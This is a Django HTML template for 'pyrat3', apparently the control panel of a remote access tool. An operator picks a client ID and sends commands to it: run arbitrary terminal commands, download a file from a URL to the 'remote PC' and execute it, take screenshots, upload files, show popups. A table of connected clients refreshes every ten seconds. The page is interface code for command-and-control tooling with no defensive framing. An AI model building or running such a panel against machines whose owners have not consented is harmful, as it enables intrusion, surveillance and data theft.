<!DOCTYPE html>
<html lang="en">
<head>
    {% load static %}
    {% load user_tags %}
    <meta charset="UTF-8">
    <link rel="stylesheet" href="{% static 'css/styles.css' %}">
    <title>pyrat3 :: home</title>
    <script src="https://code.jquery.com/jquery-3.4.0.min.js"
            integrity="sha256-BJeo0qm959uMBGb65z40ejJYGSgR7REI4+CW1fNKwOg="
            crossorigin="anonymous">
    </script>
    <script>
        $(document).ready(function(){
            $('input[type="radio"]').click(function(){
                var command = $(this).val();
                $("div.form-area-last-command-args-field-empty").hide();
                $("div.form-area-last-command-args-field").hide();
                $("div.form-area-last-command-args-field > .arg-field textarea, select").each(function() {
                    $(this).removeAttr('required');
                });
                $("#form_area_" + command + "_args_field").show();
                $("#form_area_" + command + "_args_field > .arg-field textarea, select").each(function() {
                    $(this).attr('required', 'required');
                });
            });
        });
    </script>
</head>
<body>
    <div id="header_area" class="header-area">
        <pre>
 ______   __  __     ______     ______     ______
/\  == \ /\ \_\ \   /\  == \   /\  __ \   /\__  _\
\ \  _-/ \ \____ \  \ \  __<   \ \  __ \  \/_/\ \/
 \ \_\    \/\_____\  \ \_\ \_\  \ \_\ \_\    \ \_\
  \/_/     \/_____/   \/_/ /_/   \/_/\/_/     \/_/

        </pre>
    </div>
        <form id="command_form">
            <div id="form_area" class="form-area">
                {% csrf_token %}
                {{ form.non_field_errors }}
                {{ form.source.errors }}
                {{ form.source }}
                <div id="form_area_last_command_id_field" class="form-area-last-command-id-field">
                    {{ form.last_command_id.label_tag }}
                    {{ form.last_command_id.errors }}
                    {{ form.last_command_id }}
                </div>
                <div id="form_area_client_id_field" class="form-area-client-id-field">
                    {{ form.client_id.label_tag }}
                    {{ form.client_id.errors }}
                    {{ form.client_id }}
                </div>
                <div id="form_area_last_command_field" class="form-area-last-command-field">
                    {{ form.last_command.label_tag }}
                    {{ form.last_command.errors }}
                    {{ form.last_command }}
                </div>
                <div id="form_area_last_command_args_field_empty" class="form-area-last-command-args-field-empty">
                    <label>Command args:</label>
                    <p>Please select radio button with type of command to see required arguments</p>
                </div>
                <div id="form_area_popup_args_field" class="form-area-last-command-args-field">
                    <label>Popup args:</label>
                    <div class="arg-field">
                        <label for="title">Title: </label>
                        <textarea name="title"  id="title"></textarea>
                    </div>
                    <div class="arg-field">
                        <label for="text">Text: </label>
                        <textarea name="text"  id="text"></textarea>
                    </div>
                </div>
                <div id="form_area_run_command_args_field" class="form-area-last-command-args-field">
                    <label>
                        Run command args:
                        <a href="#" id="add_input">+</a>
                        <a href="#" id="remove_input">-</a>
                    </label>
                    <div class="arg-field">
                        <label for="terminal">Terminal:</label>
                         <select name = "terminal" id="terminal">
                            <option value = "True" selected>True</option>
                            <option value = "False">False</option>
                         </select>
                    </div>
                    <div class="arg-field">
                        <label for="arg0">Arg0:</label>
                        <textarea name="arg0" id="arg0"></textarea>
                    </div>
                    <script>
                        var max_fields = 8;
                        var min_fields = 2;
                        var ct = 1;
                        var wrapper = $('#form_area_run_command_args_field');

                        $(wrapper).on('click', '#add_input', function(e) {
                            e.preventDefault();
                            var total_fields = $('#form_area_run_command_args_field > div').length
                            if(total_fields <= max_fields){
                                // Additional div must be added, for removing button function
                                $(wrapper).append(`<div class="arg-field"><label for="arg${ct}">Arg${ct}:</label>\
                                <textarea name="arg${ct}" id="arg${ct}" required="required"></textarea></div>`);
                                ct++;
                            } else {
                            alert('Max fields');
                            }
                        });
                        $(wrapper).on('click', '#remove_input', function(e) {
                            e.preventDefault();
                            var total_fields = $('#form_area_run_command_args_field > div').length
                            if(total_fields > min_fields){
                                $(wrapper).children().last().remove();
                                ct--;
                            } else {
                            alert('Min fields');
                            }
                        });
                    </script>
                </div>
                <div id="form_area_file_download_args_field" class="form-area-last-command-args-field">
                    <label>Download file args</label>
                    <div class="arg-field">
                        <label for="url">URL:</label>
                        <textarea name="url"  id="url"></textarea>
                    </div>
                    <div class="arg-field">
                        <label for="d_path">Save path on remote PC:</label>
                        <textarea name="d_path"  id="d_path"></textarea>
                    </div>
                    <div class="arg-field">
                        <label for="arg0">Execute:</label>
                         <select name = "execute"  id="execute">
                            <option value = "True" selected>True</option>
                            <option value = "False">False</option>
                         </select>
                    </div>
                </div>
                <div id="form_area_screenshoot_args_field" class="form-area-last-command-args-field">
                    <label>Screenshoot args:</label>
                    <p>Screenshoot command has no args</p>
                </div>
                <div id="form_area_file_upload_args_field" class="form-area-last-command-args-field">
                    <label>Upload file args</label>
                    <div class="arg-field">
                        <label for="file_path">Save path on remote PC:</label>
                        <textarea name="file_path"  id="file_path"></textarea>
                    </div>
                </div>
                <div id="form_area_last_command_args_field" class="form-area-last-command-args-field">
                    {{ form.last_command_args.label_tag }}
                    {{ form.last_command_args.errors }}
                    {{ form.last_command_args }}
                </div>
            </div>
            <button class="send-command" type="submit">GO!</button>
        </form>
        <script>
                $(document).ready(function() {
                    console.log('TEST1');
                    $('#command_form').on("submit", function(e) {
                        e.preventDefault();
                        console.log('TEST2');

                        var args_dict = {};
                        var selected_command = $('#form_area_last_command_field input:checked').attr('value');
                        console.log(selected_command);

                        $('#form_area_' + selected_command + '_args_field input').each(function () {
                            args_dict[this.id] = this.value;
                        });
                        $('#form_area_' + selected_command + '_args_field textarea').each(function () {
                            args_dict[this.id] = this.value;
                        });
                        $('#form_area_' + selected_command + '_args_field select').each(function () {
                            args_dict[this.id] = this.value;
                        });
                        //console.log(arg_dict);
                        args_json = JSON.stringify(args_dict);
                        console.log(args_json);

                        $('#id_last_command_args').val(args_json);

                        // exclude divs and inputs
                        var datastring = $('#command_form :not(.arg-field textarea, .arg-field select)').serialize();
                        console.log(datastring);

                        $.ajax({
                            url: 'index',
                            type: 'POST',
                            data: datastring,
                        })
                        .done(function(response) {
                            console.log(response);
                            $('#ajax_status').empty();
                            if (response.form_valid) {
                                $('#ajax_status').append('AJAX request with command '
                                + selected_command + ' was successfully processed');
                            } else {
                                $('#ajax_status').append('Server was not returned confirmation about processing command '
                                + selected_command + '. Try again.');
                            }
                        })
                        .fail(function(response) {
                            console.log(response);
                            if (!response.form_valid) {
                                $('#ajax_status').append('AJAX request with command '
                                + selected_command +
                                ' was not successfully processed. Form validation failed.');
                            } else {
                                $('#ajax_status').append('Server was unable to process AJAX request with command '
                                + selected_command + '. Unknown error');
                            }
                        });
                    });
                });
            </script>
    <div class="ajax-status" id="ajax_status">
        Brak informacji o statusie żądania AJAX.
    </div>
    <div id="fresh_client_table">
        <script>
            // Import a table with users from another file
            $('document').ready(function(){
                setInterval(function(){
                    $.ajax({
                        url: 'client_table #client_table',
                    }).done(function(data) {
                        $('#fresh_client_table').html(data);
                    });
                }, 10000);
            });
        </script>
    </div>
</body>
</html>